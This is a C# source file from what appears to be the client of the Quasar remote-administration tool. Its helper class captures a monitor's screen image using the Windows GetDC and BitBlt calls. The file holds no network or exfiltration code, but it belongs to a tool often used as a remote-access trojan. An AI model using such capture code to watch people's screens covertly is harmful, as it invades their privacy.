using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;
        private const int CAPTUREBLT = 0x40000000;

        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                //IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
                IntPtr srcDeviceContext = NativeMethods.GetDC((IntPtr)0);
                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, 1087111200);

                //NativeMethods.DeleteDC(srcDeviceContext);
                NativeMethods.ReleaseDC((IntPtr)0, srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }
    }
}
